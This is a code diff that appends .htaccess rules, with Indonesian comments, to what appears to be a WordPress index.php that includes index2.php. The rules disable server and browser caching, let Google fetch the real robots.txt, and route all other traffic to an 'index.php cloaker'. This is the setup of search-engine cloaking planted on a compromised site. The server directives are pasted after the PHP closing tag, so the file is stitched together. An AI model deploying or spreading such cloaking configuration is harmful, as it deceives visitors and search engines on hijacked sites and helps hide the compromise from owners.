@@ -65,3 +65,38 @@ if (file_exists(__DIR__ . '/wp-blog-header.php')) {
     include_once('index2.php');
 }
 ?>
+
+
+
+//includes .htaccess
+
+# 1. PAKSA SERVER UNTUK TIDAK MENCEGAT SCRIPT PHP (ANTI-CACHE)
+<IfModule LiteSpeed>
+    CacheDisable public /
+    CacheDisable private /
+    RewriteEngine On
+    RewriteRule .* - [E=Cache-Control:no-cache]
+    SetEnv noabort 1
+</IfModule>
+
+# 2. MATIKAN CACHE STANDAR BROWSER & BOT
+<IfModule mod_headers.c>
+    Header set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
+    Header set Pragma "no-cache"
+    Header set Expires "0"
+</IfModule>
+
+# 3. ATURAN WORDPRESS & CLOAKING
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteBase /
+    
+    # Izinkan Google membaca robots.txt asli
+    RewriteRule ^robots\.txt$ - [L]
+    
+    # Lemparkan semua sisa traffic ke index.php cloaker
+    RewriteRule ^index\.php$ - [L]
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule . /index.php [L]
+</IfModule>
